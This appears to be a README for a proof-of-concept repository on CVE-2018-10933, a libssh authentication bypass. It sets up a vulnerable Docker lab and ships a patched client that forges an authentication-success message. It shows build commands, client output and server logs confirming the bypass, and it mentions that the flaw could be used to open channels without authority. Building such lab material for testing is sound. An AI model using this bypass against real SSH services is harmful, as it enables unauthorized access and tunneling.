# CVE-2018-10933
CVE-2018-10933 libssh authentication bypass, vulnerable Docker container that listens on port 2222
for exploitation. A crude proof-of-concept is included in the container to bypass auth. To login
use the default "myuser" / "mypassword" from libssh. A patch is applied to a copy of libssh in 
the Docker container which injects a SSH2_MSG_USERAUTH_SUCCESS during any authentication attempt
and sets the client to forcefully accept authentication.

```
./build.sh
./run.sh
ssh -l myuser -p 2222 localhost
```

A patched exploit-libssh-0.8.3 and examples are available in the container for testing purposes.
The "ssh-client" will successfully bypass authentication but is unable to spawn a shell.

``` 
[root@305b48cb932e examples]# ./ssh-client -l root 127.0.0.1
The server is unknown. Do you trust the host key (yes/no)?
SHA256:Mg6j2yHWMsRe56ABhAYjLIJK9yD2N3lGQAl3EfGqP7w
yes
This new key will be written on disk for further usage. do you agree ?
yes
Requesting shell : Channel request shell failed
[root@305b48cb932e examples]# 
```

You should see an authentication successful response on the server, despite the failure to shell.
This could be used for tunneling connections and opening channels without authority on an 
impacted SSH service.

```
[2018/10/19 01:26:24.886695, 3] ssh_packet_userauth_success:  Authentication successful
[2018/10/19 01:26:24.928635, 3] ssh_packet_socket_callback:  packet: read type 50 [len=44,padding=8,comp=35,payload=35]
[2018/10/19 01:26:24.928709, 3] ssh_packet_process:  Dispatching handler for packet type 50
[2018/10/19 01:26:24.928735, 3] ssh_packet_userauth_request:  Auth request for service ssh-connection, method none for user 'root'
[2018/10/19 01:26:24.928761, 3] ssh_auth_reply_default:  Sending a auth failure. methods that can continue: password
[2018/10/19 01:26:24.928880, 3] ssh_socket_unbuffered_write:  Enabling POLLOUT for socket
[2018/10/19 01:26:24.928914, 3] packet_send2:  packet: wrote [len=28,padding=13,comp=14,payload=14]
[2018/10/19 01:26:24.929111, 3] ssh_packet_socket_callback:  packet: read type 52 [len=44,padding=8,comp=35,payload=35]
[2018/10/19 01:26:24.929187, 3] ssh_packet_process:  Dispatching handler for packet type 52
[2018/10/19 01:26:24.929228, 3] ssh_packet_userauth_success:  Authentication successful
[2018/10/19 01:26:24.971901, 3] ssh_packet_socket_callback:  packet: read type 90 [len=44,padding=19,comp=24,payload=24]
[2018/10/19 01:26:24.971984, 3] ssh_packet_process:  Dispatching handler for packet type 90
[2018/10/19 01:26:24.972012, 3] ssh_packet_channel_open:  Clients wants to open a session channel
[2018/10/19 01:26:24.972057, 3] ssh_message_channel_request_open_reply_accept_channel:  Accepting a channel request_open for chan 43
[2018/10/19 01:26:24.972193, 3] ssh_socket_unbuffered_write:  Enabling POLLOUT for socket
[2018/10/19 01:26:24.972233, 3] packet_send2:  packet: wrote [len=28,padding=10,comp=17,payload=17]
```

# Impacted Vendors
The following vendors appear to be practically impacted by this flaw due to their use of libssh.

F5 https://support.f5.com/csp/article/K52868493

